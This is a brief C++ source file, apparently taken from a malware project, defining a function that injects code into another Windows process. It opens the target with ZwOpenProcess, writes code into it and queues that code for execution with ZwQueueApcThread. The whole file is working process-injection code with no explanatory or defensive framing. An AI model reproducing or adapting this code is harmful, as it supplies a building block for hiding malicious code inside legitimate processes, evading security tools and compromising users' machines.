#include "core\injects.h"

bool InjectIntoProcess3( DWORD pid, HANDLE hthread, typeFuncThread func )
{
	bool ret = false;
	OBJECT_ATTRIBUTES oa;
	Mem::Zero(oa);
	oa.uLength = sizeof(OBJECT_ATTRIBUTES);

	CLIENT_ID clientID;
	clientID.UniqueProcess = (HANDLE)pid;
	clientID.UniqueThread  = 0;

	HANDLE hprocess;
		
	if ( API(NTDLL, ZwOpenProcess)( &hprocess, PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE, &oa, &clientID ) == STATUS_SUCCESS )
	{
		ADDR addr = InjectCode( hprocess, func, 0 );
		if( addr )
		{
			NTSTATUS status = API(NTDLL, ZwQueueApcThread)( hthread, (PKNORMAL_ROUTINE)addr, NULL, NULL, NULL );
			if( status == STATUS_SUCCESS )
				ret = true;
		}
		API(NTDLL, ZwClose)(hprocess);
	}

	return ret;
}
